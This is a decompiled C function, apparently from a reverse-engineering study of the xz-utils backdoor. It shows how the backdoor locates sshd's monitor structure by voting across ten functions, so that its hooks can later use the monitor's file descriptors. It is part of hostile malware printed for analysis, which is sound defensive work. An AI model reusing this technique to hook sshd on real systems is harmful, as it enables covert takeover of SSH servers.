// /home/kali/xzre-ghidra/xzregh/103DB0_sshd_find_monitor_struct.c
// Function: sshd_find_monitor_struct @ 0x103DB0
// Calling convention: unknown
// Prototype: undefined sshd_find_monitor_struct(void)


/*
 * AutoDoc: Calls `sshd_find_monitor_field_addr_in_function` across ten monitor-related routines
 * (accept/recv/send helpers, channel handlers, etc.), tallies how many times each BSS address
 * shows up, and picks the consensus pointer when at least five hits agree. The winner is stored
 * in `ctx->struct_monitor_ptr_address` so later hooks can dereference monitor->m_sendfd/m_recvfd
 * directly.
 */
#include "xzre_types.h"


undefined8 sshd_find_monitor_struct(undefined8 param_1,long param_2,long param_3)

{
  int iVar1;
  long lVar2;
  long lVar3;
  long lVar4;
  uint uVar5;
  long lVar6;
  ulong uVar7;
  ulong uVar8;
  long lVar9;
  long *plVar10;
  uint *puVar11;
  byte bVar12;
  void *monitor_candidates [10];
  uint monitor_field_hits [10];
  long local_d0;
  uint local_c8 [18];
  long lStack_80;
  long local_78 [10];
  
  bVar12 = 0;
  iVar1 = secret_data_append_from_call_site(0xda,0x14,0xf,0);
  if ((iVar1 != 0) && (local_d0 = 0, *(long *)(*(long *)(param_3 + 0x20) + 0xa8) != 0)) {
    *(undefined8 *)(param_3 + 0x48) = 0;
    lVar2 = elf_get_data_segment(param_1,&local_d0,0);
    if (lVar2 != 0) {
      lVar9 = 0;
      lVar3 = local_d0 + lVar2;
      local_c8[0] = 4;
      local_c8[1] = 5;
      local_c8[2] = 6;
      local_c8[3] = 7;
      local_c8[4] = 8;
      local_c8[5] = 9;
      local_c8[6] = 10;
      local_c8[7] = 0xb;
      local_c8[8] = 0xc;
      local_c8[9] = 0xd;
      plVar10 = local_78;
      for (lVar6 = 0x14; lVar6 != 0; lVar6 = lVar6 + -1) {
        *(undefined4 *)plVar10 = 0;
        plVar10 = (long *)((long)plVar10 + ((ulong)bVar12 * -2 + 1) * 4);
      }
      do {
        lVar4 = (ulong)local_c8[lVar9] * 0x20 + param_2;
        lVar6 = *(long *)(lVar4 + 8);
        if (lVar6 != 0) {
          sshd_find_monitor_field_addr_in_function
                    (lVar6,*(undefined8 *)(lVar4 + 0x10),lVar2,lVar3,(long)local_78 + lVar9 * 8,
                     param_3);
        }
        lVar9 = lVar9 + 1;
      } while (lVar9 != 10);
      puVar11 = local_c8 + 10;
      for (lVar2 = 10; lVar2 != 0; lVar2 = lVar2 + -1) {
        *puVar11 = 0;
        puVar11 = puVar11 + (ulong)bVar12 * -2 + 1;
      }
      lVar2 = 0;
      do {
        uVar8 = 0;
        do {
          uVar7 = uVar8 & 0xffffffff;
          if ((uint)lVar2 <= (uint)uVar8) {
            local_c8[lVar2 + 10] = local_c8[lVar2 + 10] + 1;
            goto LAB_00103f07;
          }
          uVar8 = uVar8 + 1;
        } while ((&lStack_80)[uVar8] != *(long *)((long)local_78 + lVar2 * 8));
        local_c8[uVar7 + 10] = local_c8[uVar7 + 10] + 1;
LAB_00103f07:
        lVar2 = lVar2 + 1;
      } while (lVar2 != 10);
      uVar8 = 0;
      uVar7 = 0;
      uVar5 = 0;
      do {
        if (uVar5 < local_c8[uVar8 + 10]) {
          uVar7 = uVar8 & 0xffffffff;
          uVar5 = local_c8[uVar8 + 10];
        }
        uVar8 = uVar8 + 1;
      } while (uVar8 != 10);
      if ((4 < uVar5) && (lVar2 = *(long *)((long)local_78 + uVar7 * 8), lVar2 != 0)) {
        *(long *)(param_3 + 0x48) = lVar2;
        return 1;
      }
    }
  }
  return 0;
}

